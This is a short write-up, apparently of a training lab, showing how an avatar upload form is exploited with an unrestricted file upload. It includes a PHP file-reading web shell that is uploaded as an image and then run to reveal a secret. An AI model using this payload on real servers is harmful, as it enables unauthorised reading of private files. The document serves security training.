@@ -1,0 +1,29 @@
+in the my account page there is avatar option witch allows you to upload images.
+
+let test if it is vulnerable to file uplode vulnerability
+
+
+first prepare script
+file name : lab_1_shell.php
+->
+<?php echo file_get_contents('/path/to/target/file'); ?>
+<-
+
+this is the script we're gonna use
+
+now let's upload this file
+
+the file has been uploaded successfully
+
+let's access the file by double clicking on the broken photo in my account page
+path:/files/avatars/lab_1_shell.php
+
+reflected data: yQ3XPkulKuOU2bR4DfjyCFUKE6SyXo4V
+
+in real live scenarios you will probably find move data about the user
+
+submit the solution
+
+solved
+
+
